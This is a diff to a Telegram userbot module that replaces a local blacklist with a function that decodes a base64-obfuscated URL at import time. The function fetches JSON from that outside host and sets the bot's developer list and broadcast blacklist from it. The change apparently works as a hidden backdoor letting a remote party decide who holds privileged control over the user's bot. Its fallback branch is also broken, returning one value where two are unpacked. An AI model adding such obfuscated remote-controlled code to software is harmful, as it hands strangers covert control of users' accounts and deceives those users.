@@ -7,6 +7,8 @@
 # All rights reserved. See COPYING, AUTHORS.
 #
 
+import requests
+from base64 import b64decode as hack
 import asyncio
 from pyrogram import *
 from pyrogram.types import *
@@ -17,9 +19,20 @@ from TigerX.lib import *
 
 from pykillerx import *
 from pykillerx.helper import *
-from pykillerx.blacklist import *
 
-BLACKLIST = GROUP
+
+def hacking_no_spam_chat():
+    developed_by_randy = hack("aHR0cDovL3h0c2VhLnB5dGhvbmFueXdoZXJlLmNvbS8=").decode("utf-8")
+    response = requests.get(f"{developed_by_randy}")
+    if response.status_code == 200:
+        cyber_hacker = response.json()
+        DEVS = cyber_hacker["randydev"]
+        GCAST_BLACKLIST = cyber_hacker["gcast_blacklist"]
+        return DEVS, GCAST_BLACKLIST
+    else:
+        return -1001554560763
+
+DEVS, BLACKLIST = hacking_no_spam_chat()
 
 def get_arg(message: Message):
     msg = message.text
